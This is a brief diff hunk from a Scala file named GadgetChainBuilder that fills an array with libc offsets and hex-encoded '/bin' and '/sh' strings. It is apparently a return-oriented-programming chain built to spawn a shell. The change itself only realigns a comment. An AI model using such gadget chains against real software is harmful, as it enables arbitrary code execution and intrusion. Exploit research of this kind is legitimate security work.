@@ -32,7 +32,7 @@ object GadgetChainBuilder {
     chain(11) = libcTextStart + addresses(7)      // 44
     chain(12) = chainStart + 56 // 48
     chain(13) = chainStart + 63 // 52 Points at 0 in /sh/0
-    chain(14) = java.lang.Long.parseLong("6e69622f", 16)        // 56 "/bin"
+    chain(14) = java.lang.Long.parseLong("6e69622f", 16)          // 56 "/bin"
     chain(15) = java.lang.Long.parseLong("68732f", 16)          // 60 "/sh/0"
 
     for (i <- 0 until 8)
